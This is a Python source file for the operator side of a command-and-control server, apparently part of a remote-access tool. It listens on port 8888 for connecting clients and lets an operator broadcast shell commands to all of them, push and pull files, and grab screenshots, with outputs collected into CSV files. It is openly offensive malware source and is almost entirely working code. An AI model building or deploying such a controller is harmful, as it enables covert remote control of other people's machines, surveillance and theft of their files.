import logging
import mimetypes
import os
from concurrent.futures.thread import ThreadPoolExecutor
from datetime import datetime
from select import select
from shlex import split, quote
from socket import socket, MSG_PEEK
from threading import Thread

import magic
import pandas

from utils import C2Socket, Commands

THREADED = True
FILENAME_LOG = "server.log"
DOWNLOAD_DIRECTORY = "./download"
N_WORKERS = os.cpu_count()

logging.basicConfig(filename=FILENAME_LOG, level=logging.DEBUG)

clients = dict()  # type: dict[tuple[str,int],Client]


class Client(C2Socket):
    def send_command(self, command: str, args=''):
        full_command = (command + ' ' + args).encode()
        self.send_packet(full_command)


class CommandLauncher:
    def is_valid(self):
        try:
            self.cmd, *self.cmd_args = split(user_input)
        except ValueError as e:
            print(e)
            return False
        clients_cleaner()
        return True

    def __init__(self, u_input):
        self.command_id = get_datetime()
        self.input = u_input
        self.cmd = None
        self.cmd_args = None
        self.shared = list()
        self.path = f'{DOWNLOAD_DIRECTORY}/{self.command_id}'
        self.is_path_created = False

    def get_path(self):
        if not self.is_path_created:
            os.makedirs(self.path, exist_ok=True)
            self.is_path_created = True
        return self.path

    def teardown(self):
        name = 'teardown_%s' % self.cmd
        if hasattr(self, name):
            logging.debug("Starting teardown : %s" % name)
            getattr(self, name)()
        else:
            logging.debug("No teardown named : %s" % name)

    def start(self):
        commands = [ServerCommands(self, client) for client in clients.values()]

        if sum([1 if c.is_valid() else 0 for c in commands]) != len(commands):
            print("There is some errors")
            return

        if THREADED:
            with ThreadPoolExecutor(N_WORKERS) as ex:
                list(ex.map(lambda x: x.execute(), [c for c in commands]))
        else:
            for command in commands:
                command.execute()

        self.teardown()

    def teardown_sh(self):
        pandas.DataFrame \
            .from_records(self.shared, columns=['host', 'output']) \
            .sort_values(by="host") \
            .to_csv(f'{self.get_path()}/output.csv')


class ServerCommands(Commands):
    def __init__(self, launcher: CommandLauncher, sock: Client):
        super().__init__(sock, launcher.cmd, launcher.cmd_args, launcher.input)
        self.sock = sock
        self.launcher = launcher

    def command_upload(self, local_fn: str, dist_fn: str):
        self.sock.send_command('upload', quote(dist_fn))
        with open(local_fn, 'rb') as file:
            self.sock.send_file(file)

    def command_download(self, filename: str):
        self.sock.send_command('download', quote(filename))
        filename = f"{self.launcher.get_path()}/download_{self.sock.ip}_{self.sock.port}"
        with open(filename, 'wb') as file:
            self.sock.read_into_file(file)
        try:
            ext = mimetypes.guess_extension(magic.Magic(mime=True).from_file(filename))
            if ext:
                os.rename(filename, filename + ext)
        except OSError as e:
            print("Cannot guess mime type : ", e)

    def command_screenshot(self):
        self.sock.send_command("screenshot")

        filename = f'screenshot_{self.sock.ip}_{self.sock.port}.png'
        with open(f'{self.launcher.get_path()}/{filename}', 'wb') as file:
            self.sock.read_into_file(file)

    def command_list(self):
        print(f"{self.sock.ip}:{self.sock.port}")

    def command_sh(self, *cmd):
        self.sock.send_command("sh", self.input)
        out = self.sock.read_packet().strip()
        try:
            out = out.decode()
            print("%s:%s" % (self.sock.ip, self.sock.port), out.split('\n', maxsplit=2)[0])
        except ValueError:
            pass
        self.launcher.shared.append(("%s:%s" % (self.sock.ip, self.sock.port), out))


def get_datetime():
    return datetime.now().strftime("%Y-%m-%d-%H-%M-%S")


def clients_cleaner():
    """ Remove disconnected clients from global dictionnary.

    Using non-blocking select on clients sockets, we find all ready-to-read clients.
    Then, we try to read bytes from socket (using MSG_PEEK then not removing data from recv queue).
    If empty, it means the client is disconnected.

    TODO: manage blocking recv

    """
    index = {cli.sock: cli for cli in clients.values()}  # type: dict[socket, Client]
    r, w, e = select(index.keys(), [], [], 0)
    for sock_cli in r:  # type: socket
        try:
            if not len(sock_cli.recv(32, MSG_PEEK)):
                raise Exception()
        except:
            clients.pop(index.get(sock_cli).remote)


class ServerThread(Thread):
    def __init__(self, address):
        super().__init__(name='ServerThread', daemon=True)

        self.socket = socket()
        self.socket.bind(address)
        self.socket.listen(10)

    def run(self):
        print("Server started")
        while True:
            client_sock, client_addr = self.socket.accept()
            print(f'Client {client_addr} connected')

            clients[client_addr] = Client(*client_addr, client_sock)

    def __del__(self):
        print("Exit")
        self.socket.__exit__()


server_thread = ServerThread(('0.0.0.0', 8888))
server_thread.start()
try:
    while True:
        user_input = input(">> ").strip()
        if user_input:
            if user_input in ["quit", "exit", "bye"]:
                break

            cf = CommandLauncher(user_input)
            if not cf.is_valid():
                print("Bad syntax")
            cf.start()
except KeyboardInterrupt:
    pass
finally:
    for s in clients.values():
        s.__exit__()
    server_thread.socket.__exit__()
